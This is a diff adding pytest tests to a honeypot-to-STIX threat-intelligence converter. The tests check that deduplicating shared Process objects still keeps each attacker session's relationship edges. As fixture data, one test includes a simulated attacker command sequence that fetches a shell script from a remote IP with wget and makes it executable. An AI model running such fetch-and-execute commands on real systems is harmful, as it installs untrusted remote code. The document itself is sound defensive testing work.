@@ -202,3 +202,55 @@ def test_the_process_carries_no_per_session_attribution(cfg):
     assert not any(l.startswith("sensor:") for l in p["x_opencti_labels"]), \
         f"sensor label on a shared object: {p['x_opencti_labels']}"
     assert "command-transcript" in p["x_opencti_labels"], "guard: labels intact"
+
+
+# --- the dedup trap -----------------------------------------------------------
+#
+# build_process returns None for TWO reasons: the session was recon-only and
+# dropped, or _dedup already emitted this object in this bundle. Under the old
+# session-scoped ids the second case was nearly unreachable. Content-addressing
+# makes it the COMMON case -- and the callers' `if proc:` treated it as "no
+# Process", silently dropping the second session's Process -> IPv4 and
+# Process -> File edges. That would delete exactly the attribution this change
+# moves onto the relationships, for exactly the sessions that share a
+# transcript. Caught by codex on review of PR #43.
+
+def _proc_edges(objs, pid):
+    return [o for o in objs if o.get("type") == "relationship"
+            and o.get("source_ref") == pid]
+
+
+def test_the_second_session_with_a_known_transcript_keeps_its_edges(cfg):
+    """Two attackers, one transcript, ONE builder (so dedup fires)."""
+    from tpot2cti.stix.builder import STIXBuilder
+    from tpot2cti.stix_ids import generate_process_id
+    cmds = ["wget http://203.0.113.7/x.sh", "chmod +x x.sh"]
+    b = STIXBuilder(cfg)
+
+    first = b.build_cowrie_session(_full_session(commands=cmds))
+    pid = generate_process_id(cmds)
+    assert any(o.get("id") == pid for o in first), "guard: first must emit it"
+    assert _proc_edges(first, pid), "guard: first must get its edge"
+
+    second = b.build_cowrie_session(
+        _full_session(commands=cmds, src_ip="198.51.100.9", session_id="s2"),
+    )
+    # The Process itself is correctly NOT re-emitted -- that is the whole point.
+    assert not any(o.get("id") == pid for o in second), \
+        "the shared Process was emitted twice in one bundle"
+    # ...but this attacker's link to it must still exist, or they vanish.
+    assert _proc_edges(second, pid), (
+        "second session running a known transcript lost its Process edges — "
+        "dedup-None was mistaken for no-Process"
+    )
+
+
+def test_a_dropped_process_still_gets_no_edges(cfg):
+    """The other None. Distinguishing the two cases must not blur them."""
+    from tpot2cti.stix.builder import STIXBuilder
+    from tpot2cti.stix_ids import generate_process_id
+    cmds = ["uname -a", "whoami"]           # recon-only → dropped
+    assert cfg.cycle.drop_recon_process, "guard: fixture relies on the default"
+    objs = STIXBuilder(cfg).build_cowrie_session(_full_session(commands=cmds))
+    assert not _proc_edges(objs, generate_process_id(cmds)), \
+        "edge anchored on a Process that was deliberately dropped"
